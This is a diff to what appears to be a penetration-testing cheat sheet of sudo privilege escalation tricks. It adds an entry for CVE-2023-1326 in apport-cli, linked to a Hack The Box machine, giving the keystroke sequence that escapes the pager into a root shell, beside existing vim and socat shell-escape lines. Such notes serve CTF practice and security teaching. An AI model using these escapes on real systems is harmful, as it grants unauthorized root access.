@@ -127,6 +127,19 @@ $ sudo vim -c ':!/bin/sh'
 ```ps
 $ sudo socat stdin exec:/bin/bash
 ```
+
+* [apport-cli](https://manpages.ubuntu.com/manpages/focal/en/man1/apport-cli.1.html) 2.26.0 and earlier has a vulnerability ([CVE-2023-1326](https://nvd.nist.gov/vuln/detail/CVE-2023-1326)) 
+
+[![devvortex](../../../../_badges/htb-p/devvortex.svg)](https://app.hackthebox.com/machines/Devvortex)
+
+```ps
+$ sudo /usr/bin/apport-cli --file-bug
+> 1
+> 2
+> F # any key
+> V # view report (open less)
+:!/bin/bash
+```
 </div><div>
 
 ...
